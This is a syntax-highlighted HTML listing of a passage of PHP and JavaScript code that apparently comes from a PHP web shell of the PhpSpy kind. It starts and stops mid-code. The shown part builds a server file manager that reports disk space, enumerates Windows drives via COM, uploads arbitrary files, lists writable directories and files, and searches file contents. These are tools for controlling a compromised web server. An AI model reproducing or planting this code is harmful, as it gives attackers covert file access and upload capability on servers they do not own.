<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">free</span> = @<span style="color: #ffffff; background-color: #002451;">disk_free_space(</span>$<span style="color: #ffeead;">nowpath</span>);
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">free</span> &amp;&amp; $<span style="color: #ffeead;">free</span> = <span style="color: #ffffff; background-color: #002451;">0</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">all</span> = @<span style="color: #ffffff; background-color: #002451;">disk_total_space(</span>$<span style="color: #ffeead;">nowpath</span>);
<span style="background-color: #003f8e;"> </span>   !$<span style="color: #ffeead;">all</span> &amp;&amp; $<span style="color: #ffeead;">all</span> = <span style="color: #ffffff; background-color: #002451;">0</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">used</span> = $<span style="color: #ffeead;">all</span>-$<span style="color: #ffeead;">free</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;h2&gt;File Manager - Current disk free '</span>.<span style="color: #ffffff; background-color: #002451;">sizecount(</span>$<span style="color: #ffeead;">free</span>).<span style="color: #99ffff;">' of '</span>.<span style="color: #ffffff; background-color: #002451;">sizecount(</span><span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">all</span><span style="text-decoration: underline;">).</span><span style="color: #99ffff; text-decoration: underline;">' ('</span><span style="text-decoration: underline;">.@</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">round(100</span><span style="text-decoration: underline;">/($</span><span style="color: #ffeead; text-decoration: underline;">all</span><span style="text-decoration: underline;">/$</span><span style="color: #ffeead; text-decoration: underline;">free</span><span style="text-decoration: underline;">),</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">2</span><span style="text-decoration: underline;">).</span><span style="color: #99ffff; text-decoration: underline;">'%)&lt;/h2&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">cwd_links</span> = <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">path</span> = <span style="color: #ffffff; background-color: #002451;">explode(</span><span style="color: #99ffff;">'/'</span>, $<span style="color: #ffeead;">nowpath</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">n</span>=<span style="color: #ffffff; background-color: #002451;">count(</span>$<span style="color: #ffeead;">path</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">for</span>($<span style="color: #ffeead;">i</span>=<span style="color: #ffffff; background-color: #002451;">0</span>;$<span style="color: #ffeead;">i</span>&lt;$<span style="color: #ffeead;">n</span>-<span style="color: #ffffff; background-color: #002451;">1</span>;$<span style="color: #ffeead;">i</span>++) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">cwd_links</span> .= <span style="color: #99ffff;">'&lt;a href="javascript:godir(\''</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">for</span>($<span style="color: #ffeead;">j</span>=<span style="color: #ffffff; background-color: #002451;">0</span>;$<span style="color: #ffeead;">j</span>&lt;=$<span style="color: #ffeead;">i</span>;$<span style="color: #ffeead;">j</span>++) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">cwd_links</span> .= $<span style="color: #ffeead;">path</span>[$<span style="color: #ffeead;">j</span>].<span style="color: #99ffff;">'/'</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">cwd_links</span> .= <span style="color: #99ffff;">'\');"&gt;'</span>.$<span style="color: #ffeead;">path</span>[$<span style="color: #ffeead;">i</span>].<span style="color: #99ffff;">'/&lt;/a&gt;'</span>;
<span style="background-color: #003f8e;"> </span>   }

<span style="color: #ebbbff;">?&gt;</span>
<span style="color: #bbdaff;">&lt;script</span> <span style="color: #bbdaff;">type=</span><span style="color: #99ffff;">"text/javascript"</span><span style="color: #bbdaff;">&gt;</span>
<span style="color: #ff9da4; font-weight: bold;">document</span>.<span style="color: #ff9da4; font-weight: bold;">onclick</span> = <span style="color: #ff9da4; font-weight: bold;">shownav</span>;
<span style="color: #d1f1a9;">function</span> <span style="color: #ffc58f;">shownav</span>(<span style="color: #ff9da4; font-weight: bold;">e</span>){
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">var</span> <span style="color: #ff9da4; font-weight: bold;">src</span> = <span style="color: #ff9da4; font-weight: bold;">e</span>?<span style="color: #ff9da4; font-weight: bold;">e</span>.<span style="color: #ff9da4; font-weight: bold;">target</span>:<span style="color: #ff9da4; font-weight: bold;">event</span>.<span style="color: #ff9da4; font-weight: bold;">srcElement</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">do</span>{
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ff9da4; font-weight: bold;">src</span>.<span style="color: #ff9da4; font-weight: bold;">id</span> ==<span style="color: #99ffff;">"jumpto"</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'inputnav'</span>).<span style="color: #ff9da4; font-weight: bold;">style</span>.<span style="color: #ff9da4; font-weight: bold;">display</span> = <span style="color: #99ffff;">""</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'pathnav'</span>).<span style="color: #ff9da4; font-weight: bold;">style</span>.<span style="color: #ff9da4; font-weight: bold;">display</span> = <span style="color: #99ffff;">"none"</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">hidenav();</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span>(<span style="color: #ff9da4; font-weight: bold;">src</span>.<span style="color: #ff9da4; font-weight: bold;">id</span> ==<span style="color: #99ffff;">"inputnav"</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">return</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ff9da4; font-weight: bold;">src</span> = <span style="color: #ff9da4; font-weight: bold;">src</span>.<span style="color: #ff9da4; font-weight: bold;">parentNode</span>;
<span style="background-color: #003f8e;"> </span>   }<span style="color: #d1f1a9;">while</span>(<span style="color: #ff9da4; font-weight: bold;">src</span>.<span style="color: #ff9da4; font-weight: bold;">parentNode</span>)

<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'inputnav'</span>).<span style="color: #ff9da4; font-weight: bold;">style</span>.<span style="color: #ff9da4; font-weight: bold;">display</span> = <span style="color: #99ffff;">"none"</span>;
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">$(</span><span style="color: #99ffff;">'pathnav'</span>).<span style="color: #ff9da4; font-weight: bold;">style</span>.<span style="color: #ff9da4; font-weight: bold;">display</span> = <span style="color: #99ffff;">""</span>;
}
<span style="color: #bbdaff;">&lt;/script&gt;</span>
<span style="color: #bbdaff;">&lt;div</span> <span style="color: #bbdaff;">style=</span><span style="color: #99ffff;">"background:#eee;margin-bottom:10px;"</span><span style="color: #bbdaff;">&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;table</span> <span style="color: #bbdaff;">id=</span><span style="color: #99ffff;">"pathnav"</span> <span style="color: #bbdaff;">width=</span><span style="color: #99ffff;">"100%"</span> <span style="color: #bbdaff;">border=</span><span style="color: #99ffff;">"0"</span> <span style="color: #bbdaff;">cellpadding=</span><span style="color: #99ffff;">"5"</span> <span style="color: #bbdaff;">cellspacing=</span><span style="color: #99ffff;">"0"</span><span style="color: #bbdaff;">&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;tr&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;td</span> <span style="color: #bbdaff;">width=</span><span style="color: #99ffff;">"100%"</span><span style="color: #bbdaff;">&gt;</span><span style="color: #ebbbff;">&lt;?php</span> <span style="color: #d1f1a9;">echo</span> $<span style="color: #ffeead;">cwd_links</span>.<span style="color: #99ffff;">' - '</span>.<span style="color: #ffffff; background-color: #002451;">getChmod(</span>$<span style="color: #ffeead;">nowpath</span>).<span style="color: #99ffff;">' / </span><span style="color: #99ffff; text-decoration: underline;">'</span><span style="text-decoration: underline;">.</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">getPerms(</span><span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">).</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">getUser(</span><span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">);</span><span style="color: #ebbbff; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;"> (</span><span style="color: #ebbbff; text-decoration: underline;">&lt;?php</span><span style="text-decoration: underline;"> </span><span style="color: #d1f1a9; text-decoration: underline;">echo</span><span style="text-decoration: underline;"> $</span><span style="color: #ffeead; text-decoration: underline;">dir_writeable</span><span style="text-decoration: underline;">;</span><span style="color: #ebbbff; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)</span><span style="color: #bbdaff; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;td</span> <span style="color: #ff9da4; font-weight: bold;">nowrap</span><span style="color: #bbdaff;">&gt;&lt;input</span> <span style="color: #bbdaff;">class=</span><span style="color: #99ffff;">"bt"</span> <span style="color: #bbdaff;">id=</span><span style="color: #99ffff;">"jumpto"</span> <span style="color: #bbdaff;">name=</span><span style="color: #99ffff;">"jumpto"</span> <span style="color: #bbdaff;">value=</span><span style="color: #99ffff;">"Jump t</span><span style="color: #99ffff; text-decoration: underline;">o"</span><span style="text-decoration: underline;"> </span><span style="color: #bbdaff; text-decoration: underline;">type=</span><span style="color: #99ffff; text-decoration: underline;">"button"</span><span style="color: #bbdaff; text-decoration: underline;">&gt;&lt;/td&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;/tr&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;/table&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;table</span> <span style="color: #bbdaff;">id=</span><span style="color: #99ffff;">"inputnav"</span> <span style="color: #bbdaff;">width=</span><span style="color: #99ffff;">"100%"</span> <span style="color: #bbdaff;">border=</span><span style="color: #99ffff;">"0"</span> <span style="color: #bbdaff;">cellpadding=</span><span style="color: #99ffff;">"5"</span> <span style="color: #bbdaff;">cellspacing=</span><span style="color: #99ffff;">"0"</span><span style="text-decoration: underline;"> </span><span style="color: #bbdaff; text-decoration: underline;">style=</span><span style="color: #99ffff; text-decoration: underline;">"display:none;"</span><span style="color: #bbdaff; text-decoration: underline;">&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;form</span> <span style="color: #bbdaff;">action=</span><span style="color: #99ffff;">""</span> <span style="color: #bbdaff;">method=</span><span style="color: #99ffff;">"post"</span> <span style="color: #bbdaff;">id=</span><span style="color: #99ffff;">"godir"</span> <span style="color: #bbdaff;">name=</span><span style="color: #99ffff;">"godir"</span><span style="color: #bbdaff;">&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;tr&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;td</span> <span style="color: #ff9da4; font-weight: bold;">nowrap</span><span style="color: #bbdaff;">&gt;</span><span style="color: #ff9da4; font-weight: bold;">Current</span> <span style="color: #ffffff; background-color: #002451;">Directory (</span><span style="color: #ebbbff;">&lt;?php</span> <span style="color: #d1f1a9;">echo</span> $<span style="color: #ffeead;">dir_writeable</span>;<span style="color: #ebbbff;">?&gt;</span>, <span style="color: #ebbbff;">&lt;?php</span> <span style="color: #d1f1a9;">ec</span><span style="color: #d1f1a9; text-decoration: underline;">ho</span><span style="text-decoration: underline;"> </span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">getChmod(</span><span style="text-decoration: underline;">$</span><span style="color: #ffeead; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">);</span><span style="color: #ebbbff; text-decoration: underline;">?&gt;</span><span style="text-decoration: underline;">)</span><span style="color: #bbdaff; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;td</span> <span style="color: #bbdaff;">width=</span><span style="color: #99ffff;">"100%"</span><span style="color: #bbdaff;">&gt;&lt;input</span> <span style="color: #bbdaff;">name=</span><span style="color: #99ffff;">"view_writable"</span> <span style="color: #bbdaff;">value=</span><span style="color: #99ffff;">"0"</span> <span style="color: #bbdaff;">type=</span><span style="color: #99ffff;">"hidden"</span><span style="text-decoration: underline;"> /</span><span style="color: #bbdaff; text-decoration: underline;">&gt;&lt;input</span><span style="text-decoration: underline;"> </span><span style="color: #bbdaff; text-decoration: underline;">class=</span><span style="color: #99ffff; text-decoration: underline;">"input"</span><span style="text-decoration: underline;"> </span><span style="color: #bbdaff; text-decoration: underline;">name=</span><span style="color: #99ffff; text-decoration: underline;">"dir"</span><span style="text-decoration: underline;"> </span><span style="color: #bbdaff; text-decoration: underline;">value=</span><span style="color: #99ffff; text-decoration: underline;">"&lt;?php echo $nowpath;?&gt;"</span><span style="text-decoration: underline;"> </span><span style="color: #bbdaff; text-decoration: underline;">type=</span><span style="color: #99ffff; text-decoration: underline;">"text"</span><span style="text-decoration: underline;"> </span><span style="color: #bbdaff; text-decoration: underline;">style=</span><span style="color: #99ffff; text-decoration: underline;">"width:99%;margin:0 8px;"</span><span style="text-decoration: underline;">&gt;</span><span style="color: #bbdaff; text-decoration: underline;">&lt;/td&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;td</span> <span style="color: #ff9da4; font-weight: bold;">nowrap</span><span style="color: #bbdaff;">&gt;&lt;input</span> <span style="color: #bbdaff;">class=</span><span style="color: #99ffff;">"bt"</span> <span style="color: #bbdaff;">value=</span><span style="color: #99ffff;">"GO"</span> <span style="color: #bbdaff;">type=</span><span style="color: #99ffff;">"submit"</span><span style="color: #bbdaff;">&gt;&lt;/td&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;/tr&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;/form&gt;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #bbdaff;">&lt;/table&gt;</span>
<span style="color: #ebbbff;">&lt;?php</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> (<span style="color: #ff9da4; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #ff9da4; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">obj</span> = <span style="color: #d1f1a9;">new</span> <span style="color: #bbdaff;">COM</span>(<span style="color: #99ffff;">'scripting.filesystemobject'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">obj</span> &amp;&amp; <span style="color: #ffffff; background-color: #002451;">is_object(</span>$<span style="color: #ffeead;">obj</span>) &amp;&amp; $<span style="color: #ffeead;">obj</span>-<span style="color: #bbdaff;">&gt;</span><span style="color: #ffeead;">Drives</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">echo</span> <span style="color: #99ffff;">'&lt;div class="drives"&gt;'</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">DriveTypeDB</span> = <span style="color: #ffffff; background-color: #002451;">array(0</span> =&gt; <span style="color: #99ffff;">'Unknow'</span>,<span style="color: #ffffff; background-color: #002451;">1</span> =&gt; <span style="color: #99ffff;">'Removable'</span>,<span style="color: #ffffff; background-color: #002451;">2</span> =&gt; <span style="color: #99ffff;">'Fixed'</span>,<span style="color: #ffffff; background-color: #002451;">3</span> =<span style="text-decoration: underline;">&gt; </span><span style="color: #99ffff; text-decoration: underline;">'Network'</span><span style="text-decoration: underline;">,</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">4</span><span style="text-decoration: underline;"> =&gt; </span><span style="color: #99ffff; text-decoration: underline;">'CDRom'</span><span style="text-decoration: underline;">,</span><span style="color: #ffffff; background-color: #002451; text-decoration: underline;">5</span><span style="text-decoration: underline;"> =&gt; </span><span style="color: #99ffff; text-decoration: underline;">'RAM Disk'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">comma</span> = <span style="color: #99ffff;">''</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">foreach</span>($<span style="color: #ffeead;">obj</span>-&gt;<span style="color: #ffeead;">Drives</span> <span style="color: #d1f1a9;">as</span> $<span style="color: #ffeead;">drive</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">drive</span>-&gt;<span style="color: #ffeead;">Path</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span>$<span style="color: #ffeead;">comma</span>.<span style="color: #99ffff;">'&lt;a href="javascript:godir(\''</span>.$<span style="color: #ffeead;">drive</span>-<span style="color: #bbdaff;">&gt;</span><span style="color: #ffeead;">Path</span>.<span style="color: #99ffff;">'/\');"</span><span style="color: #99ffff; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">DriveTypeDB</span><span style="text-decoration: underline;">[$</span><span style="color: #ffeead; text-decoration: underline;">drive</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #ffeead; text-decoration: underline;">DriveType</span><span style="text-decoration: underline;">].</span><span style="color: #99ffff; text-decoration: underline;">'('</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">drive</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #ffeead; text-decoration: underline;">Path</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">')&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">comma</span> = <span style="color: #99ffff;">'&lt;span&gt;|&lt;/span&gt;'</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">echo</span> <span style="color: #99ffff;">'&lt;/div&gt;'</span>;
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   }
<span style="background-color: #003f8e;"> </span>   }
<span style="color: #ebbbff;">?&gt;</span>
<span style="color: #bbdaff;">&lt;/div&gt;</span>
<span style="color: #ebbbff;">&lt;?php</span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">findstr</span> = $<span style="color: #bbdaff;">_POST</span>[<span style="color: #99ffff;">'findstr'</span>];
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">re</span> = $<span style="color: #bbdaff;">_POST</span>[<span style="color: #99ffff;">'re'</span>];
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">tbhead(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="alt1"&gt;&lt;td colspan="7" style="padding:5px;line-height:20px;"&gt;'</span>)<span style="text-decoration: underline;">;</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;form action="'</span>.$<span style="color: #ffeead;">self</span>.<span style="color: #99ffff;">'" method="POST" enctype="multipart/form-data"&gt;&lt;div</span><span style="color: #99ffff; text-decoration: underline;"> style="float:right;"&gt;&lt;input class="input" name="uploadfile" value="" type="file" /&gt; &lt;input class="bt" name="doupfile" value="Upload" type="submit" /&gt;&lt;input name="uploaddir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'" type="hidden" /&gt;&lt;input name="dir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'" type="hidden" /&gt;&lt;/div&gt;&lt;/form&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;a href="javascript:godir(\''</span>.$<span style="color: #bbdaff;">_SERVER</span>[<span style="color: #99ffff;">"DOCUMENT_ROOT"</span>].<span style="color: #99ffff;">'\');"&gt;WebRoot&lt;/a</span><span style="color: #99ffff; text-decoration: underline;">&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">' | &lt;a href="javascript:godir(\'.\');"&gt;ScriptPath&lt;/a&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">' | &lt;a href="javascript:godir(\''</span>.$<span style="color: #ffeead;">nowpath</span>.<span style="color: #99ffff;">'\');"&gt;View All&lt;/a&gt;'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">' | View Writable ( &lt;a href="javascript:godir(\''</span>.$<span style="color: #ffeead;">nowpath</span>.<span style="color: #99ffff;">'\',\'dir\');"&gt;</span><span style="color: #99ffff; text-decoration: underline;">Directory&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">' | &lt;a href="javascript:godir(\''</span>.$<span style="color: #ffeead;">nowpath</span>.<span style="color: #99ffff;">'\',\'file\');"&gt;File&lt;/a&gt; )'</span>);
<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">' | &lt;a href="javascript:createdir();"&gt;Create Directory&lt;/a&gt; | &lt;a href="java</span><span style="color: #99ffff; text-decoration: underline;">script:createfile(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">nowpath</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'\');"&gt;Create File&lt;/a&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;div style="padding:5px 0;"&gt;&lt;form action="'</span>.$<span style="color: #ffeead;">self</span>.<span style="color: #99ffff;">'" method="POST"&gt;Find s</span><span style="color: #99ffff; text-decoration: underline;">tring in files(current folder): &lt;input class="input" name="findstr" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">findstr</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'" type="text" /&gt; &lt;input class="bt" value="Find" type="submit" /&gt; Type: &lt;input class="input" name="writabledb" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">writabledb</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'" type="text" /&gt;&lt;input name="dir" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #ffeead; text-decoration: underline;">dir</span><span style="text-decoration: underline;">.</span><span style="color: #99ffff; text-decoration: underline;">'" type="hidden" /&gt; &lt;input name="re" value="1" type="checkbox" '</span><span style="text-decoration: underline;">.($</span><span style="color: #ffeead; text-decoration: underline;">re</span><span style="text-decoration: underline;"> ? </span><span style="color: #99ffff; text-decoration: underline;">'checked'</span><span style="text-decoration: underline;"> : </span><span style="color: #99ffff; text-decoration: underline;">''</span><span style="text-decoration: underline;">).</span><span style="color: #99ffff; text-decoration: underline;">' /&gt; Regular expressions&lt;/form&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #003f8e;"> </span>   <span style="color: #ffffff; background-color: #002451;">p(</span><span style="color: #99ffff;">'&lt;tr class="head"&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td&gt;Filename&lt;/td&gt;&lt;td width="16%"&gt;Last mod</span><span style="color: #99ffff; text-decoration: underline;">ified&lt;/td&gt;&lt;td width="10%"&gt;Size&lt;/td&gt;&lt;td width="20%"&gt;Chmod / Perms&lt;/td&gt;&lt;td width="22%"&gt;Action&lt;/td&gt;&lt;/tr&gt;'</span><span style="text-decoration: underline;">);</span>

<span style="background-color: #003f8e;"> </span>   <span style="color: #7285b7; font-style: italic;">//</span><span style="color: #7285b7; font-style: italic;">&#26597;&#30475;&#25152;&#26377;&#21487;&#20889;&#25991;&#20214;&#21644;&#30446;&#24405;</span>
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdata</span>=<span style="color: #ffffff; background-color: #002451;">array(</span>);
<span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span>=<span style="color: #ffffff; background-color: #002451;">array(</span>);

<span style="background-color: #003f8e;"> </span>   <span style="color: #d1f1a9;">if</span> ($<span style="color: #ffeead;">view_writable</span> == <span style="color: #99ffff;">'dir'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdata</span> = <span style="color: #ffffff; background-color: #002451;">GetWDirList(</span>$<span style="color: #ffeead;">nowpath</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span> = <span style="color: #ffffff; background-color: #002451;">array(</span>);
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">view_writable</span> == <span style="color: #99ffff;">'file'</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdata</span> = <span style="color: #ffffff; background-color: #002451;">array(</span>);
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">filedata</span> = <span style="color: #ffffff; background-color: #002451;">GetWFileList(</span>$<span style="color: #ffeead;">nowpath</span>);
<span style="background-color: #003f8e;"> </span>   } <span style="color: #d1f1a9;">elseif</span> ($<span style="color: #ffeead;">findstr</span>) {
<span style="background-color: #003f8e;"> </span>   <span style="background-color: #003f8e;"> </span>   $<span style="color: #ffeead;">dirdata</span> = <span style="color: #ffffff; background-color: #002451;">array(</span>);
